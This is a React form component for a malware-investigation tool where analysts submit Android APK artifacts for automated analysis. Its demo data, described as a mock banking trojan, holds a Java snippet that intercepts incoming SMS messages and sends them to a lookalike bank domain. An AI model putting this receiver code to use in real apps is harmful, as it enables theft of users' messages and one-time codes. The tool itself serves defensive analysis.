import React, { useState } from "react";
import { useLocation } from "wouter";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useCreateInvestigation, getListInvestigationsQueryKey } from "@workspace/api-client-react";
import { useQueryClient } from "@tanstack/react-query";
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { FileCode2, Terminal, ShieldAlert, Cpu, Sparkles, Loader2, ArrowRight } from "lucide-react";
import { Progress } from "@/components/ui/progress";

const formSchema = z.object({
  sampleName: z.string().min(1, "Sample name is required"),
  sha256: z.string().length(64, "SHA-256 must be exactly 64 characters"),
  packageName: z.string().optional(),
  versionName: z.string().optional(),
  targetSdk: z.coerce.number().optional().or(z.literal("").transform(() => undefined)),
  compileSdk: z.coerce.number().optional().or(z.literal("").transform(() => undefined)),
  fuzzyHash: z.string().optional(),
  certificateFingerprint: z.string().optional(),
  certificateSubject: z.string().optional(),
  certificateIssuer: z.string().optional(),
  certificateNotBefore: z.string().optional(),
  certificateNotAfter: z.string().optional(),
  virusTotalScore: z.coerce.number().optional().or(z.literal("").transform(() => undefined)),
  virusTotalTotal: z.coerce.number().optional().or(z.literal("").transform(() => undefined)),
  abuseIpdbScore: z.coerce.number().optional().or(z.literal("").transform(() => undefined)),
  urlScanScore: z.coerce.number().optional().or(z.literal("").transform(() => undefined)),
  clusterId: z.string().optional(),
  anomalyScore: z.coerce.number().optional().or(z.literal("").transform(() => undefined)),
  gnnMaliciousProb: z.coerce.number().optional().or(z.literal("").transform(() => undefined)),
  pageRankScore: z.coerce.number().optional().or(z.literal("").transform(() => undefined)),
  permissions: z.string().optional(),
  urls: z.string().optional(),
  domains: z.string().optional(),
  ipAddresses: z.string().optional(),
  apiKeys: z.string().optional(),
  phoneNumbers: z.string().optional(),
  codeSnippets: z.string().optional()
});

type FormValues = z.infer<typeof formSchema>;

const DEMO_PAYLOAD = {
  sampleName: "com.bank.secure.update-v2.1.apk",
  sha256: "8d234568b25e1fc4a47558319f6a1e35a0928374828dfb8417c80e1b21235b3f",
  packageName: "com.bank.secure.app",
  versionName: "2.1.0",
  targetSdk: 33,
  compileSdk: 33,
  permissions: "android.permission.INTERNET, android.permission.READ_SMS, android.permission.RECEIVE_SMS, android.permission.READ_CONTACTS, android.permission.SYSTEM_ALERT_WINDOW",
  urls: "http://update-secure-bank.com/api/v1/payload, https://telemetry-analytics-api.net/ping",
  domains: "update-secure-bank.com, telemetry-analytics-api.net",
  ipAddresses: "185.199.108.153, 45.33.32.156",
  codeSnippets: `public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        if (extras != null) {
            Object[] smsextras = (Object[]) extras.get("pdus");
            for (int i = 0; i < smsextras.length; i++) {
                SmsMessage smsmsg = SmsMessage.createFromPdu((byte[])smsextras[i]);
                String strMsgBody = smsmsg.getMessageBody().toString();
                String strMsgSrc = smsmsg.getOriginatingAddress();
                
                // Exfiltrate SMS
                new NetworkTask().execute("http://update-secure-bank.com/api/v1/intercept", strMsgSrc, strMsgBody);
            }
        }
    }
}`
};

export default function NewInvestigation() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const queryClient = useQueryClient();
  
  const [analysisStep, setAnalysisStep] = useState(0);
  const [progress, setProgress] = useState(0);

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      sampleName: "",
      sha256: "",
      packageName: "",
      versionName: "",
      permissions: "",
      urls: "",
      domains: "",
      ipAddresses: "",
      apiKeys: "",
      phoneNumbers: "",
      codeSnippets: ""
    }
  });

  const createInvestigation = useCreateInvestigation();

  const loadDemoData = () => {
    Object.entries(DEMO_PAYLOAD).forEach(([key, value]) => {
      form.setValue(key as any, value);
    });
    toast({
      title: "Demo Data Loaded",
      description: "Filled form with a mock banking trojan sample.",
    });
  };

  const parseArrayField = (val?: string) => {
    if (!val) return [];
    return val.split(/[\n,]+/).map(s => s.trim()).filter(Boolean);
  };

  // Simulated analysis steps just for UI feedback
  React.useEffect(() => {
    if (createInvestigation.isPending) {
      const steps = [
        "Unpacking APK resources...",
        "Decompiling Dalvik bytecode...",
        "Analyzing Manifest permissions...",
        "Extracting network infrastructure...",
        "Correlating threat intelligence...",
        "Running autonomous AI investigation...",
        "Generating executive brief..."
      ];
      
      const interval = setInterval(() => {
        setAnalysisStep(prev => {
          if (prev >= steps.length - 1) return prev;
          return prev + 1;
        });
        setProgress(prev => Math.min(prev + (100 / steps.length), 95));
      }, 4000); // Progress every 4s
      
      return () => clearInterval(interval);
    }
    return undefined;
  }, [createInvestigation.isPending]);

  const onSubmit = (values: FormValues) => {
    setAnalysisStep(0);
    setProgress(0);
    
    const payload = {
      ...values,
      permissions: parseArrayField(values.permissions),
      urls: parseArrayField(values.urls),
      domains: parseArrayField(values.domains),
      ipAddresses: parseArrayField(values.ipAddresses),
      apiKeys: parseArrayField(values.apiKeys),
      phoneNumbers: parseArrayField(values.phoneNumbers),
      codeSnippets: values.codeSnippets || null,
    };

    createInvestigation.mutate({ data: payload }, {
      onSuccess: (data) => {
        setProgress(100);
        queryClient.invalidateQueries({ queryKey: getListInvestigationsQueryKey() });
        toast({
          title: "Investigation Complete",
          description: "Autonomous analysis finished successfully.",
        });
        setTimeout(() => {
          setLocation(`/investigations/${data.id}`);
        }, 500);
      },
      onError: (error) => {
        toast({
          title: "Analysis Failed",
          description: error.message || "An error occurred during analysis.",
          variant: "destructive"
        });
      }
    });
  };

  if (createInvestigation.isPending) {
    const steps = [
      "Unpacking APK resources...",
      "Decompiling Dalvik bytecode...",
      "Analyzing Manifest permissions...",
      "Extracting network infrastructure...",
      "Correlating threat intelligence...",
      "Running autonomous AI investigation...",
      "Generating executive brief..."
    ];
    
    return (
      <div className="min-h-[80vh] flex items-center justify-center p-6">
        <Card className="w-full max-w-md border-primary/20 shadow-lg shadow-primary/5 bg-card/80 backdrop-blur">
          <CardHeader className="text-center pb-2">
            <div className="mx-auto w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center mb-4">
              <Cpu className="h-6 w-6 text-primary animate-pulse" />
            </div>
            <CardTitle className="text-xl font-mono uppercase">Autonomous Analysis in Progress</CardTitle>
            <CardDescription>This will take 30-60 seconds.</CardDescription>
          </CardHeader>
          <CardContent className="space-y-6 pt-4">
            <Progress value={progress} className="h-2" />
            <div className="space-y-2 font-mono text-sm">
              {steps.map((step, idx) => (
                <div 
                  key={idx} 
                  className={`flex items-center gap-2 ${
                    idx < analysisStep ? "text-primary" : 
                    idx === analysisStep ? "text-foreground animate-pulse" : 
                    "text-muted-foreground/30"
                  }`}
                >
                  {idx < analysisStep ? (
                    <Sparkles className="h-3 w-3" />
                  ) : idx === analysisStep ? (
                    <Loader2 className="h-3 w-3 animate-spin" />
                  ) : (
                    <div className="h-3 w-3 rounded-full border border-current" />
                  )}
                  {step}
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="p-6 md:p-8 max-w-4xl mx-auto space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold font-mono uppercase tracking-tight text-foreground flex items-center gap-2">
            <Terminal className="h-6 w-6 text-primary" /> New Investigation
          </h1>
          <p className="text-muted-foreground text-sm mt-1">Submit APK forensic artifacts for autonomous AI analysis.</p>
        </div>
        <Button variant="outline" size="sm" onClick={loadDemoData} className="font-mono text-xs uppercase tracking-wider">
          <FileCode2 className="mr-2 h-3 w-3" /> Load Sample Trojan
        </Button>
      </div>

      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
          <Card>
            <CardHeader>
              <CardTitle className="text-sm font-mono uppercase flex items-center gap-2">
                <FileCode2 className="h-4 w-4" /> Core File Metadata
              </CardTitle>
            </CardHeader>
            <CardContent className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <FormField
                control={form.control}
                name="sampleName"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Sample Name *</FormLabel>
                    <FormControl>
                      <Input placeholder="e.g. sample-v1.apk" {...field} className="font-mono text-sm" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="sha256"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>SHA-256 Hash *</FormLabel>
                    <FormControl>
                      <Input placeholder="64-character hex string" {...field} className="font-mono text-sm" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="packageName"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Package Name</FormLabel>
                    <FormControl>
                      <Input placeholder="e.g. com.example.app" {...field} className="font-mono text-sm" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <div className="grid grid-cols-3 gap-2">
                <FormField
                  control={form.control}
                  name="versionName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Version</FormLabel>
                      <FormControl>
                        <Input placeholder="1.0" {...field} className="font-mono text-sm" />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name="targetSdk"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Target SDK</FormLabel>
                      <FormControl>
                        <Input type="number" placeholder="33" {...field} className="font-mono text-sm" />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name="compileSdk"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Compile SDK</FormLabel>
                      <FormControl>
                        <Input type="number" placeholder="33" {...field} className="font-mono text-sm" />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="text-sm font-mono uppercase flex items-center gap-2">
                <ShieldAlert className="h-4 w-4" /> Extracted Artifacts
              </CardTitle>
              <CardDescription>Enter comma or newline separated values</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <FormField
                control={form.control}
                name="permissions"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Manifest Permissions</FormLabel>
                    <FormControl>
                      <Textarea placeholder="android.permission.INTERNET, android.permission.READ_SMS..." {...field} className="font-mono text-sm min-h-[80px]" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <FormField
                  control={form.control}
                  name="urls"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Extracted URLs</FormLabel>
                      <FormControl>
                        <Textarea placeholder="http://malicious.com/api..." {...field} className="font-mono text-sm min-h-[80px]" />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name="domains"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Domains</FormLabel>
                      <FormControl>
                        <Textarea placeholder="malicious.com..." {...field} className="font-mono text-sm min-h-[80px]" />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name="ipAddresses"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>IP Addresses</FormLabel>
                      <FormControl>
                        <Textarea placeholder="192.168.1.1..." {...field} className="font-mono text-sm min-h-[80px]" />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name="apiKeys"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Hardcoded API Keys</FormLabel>
                      <FormControl>
                        <Textarea placeholder="AIzaSyB..." {...field} className="font-mono text-sm min-h-[80px]" />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>
              <FormField
                control={form.control}
                name="codeSnippets"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Decompiled Code Snippets</FormLabel>
                    <FormControl>
                      <Textarea placeholder="public void onReceive(Context context, Intent intent) { ... }" {...field} className="font-mono text-xs min-h-[200px] bg-muted/50" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </CardContent>
            <CardFooter className="bg-muted/30 py-4 flex justify-end border-t border-border">
              <Button type="submit" size="lg" className="font-mono uppercase tracking-wider">
                Run Analysis <ArrowRight className="ml-2 h-4 w-4" />
              </Button>
            </CardFooter>
          </Card>
        </form>
      </Form>
    </div>
  );
}
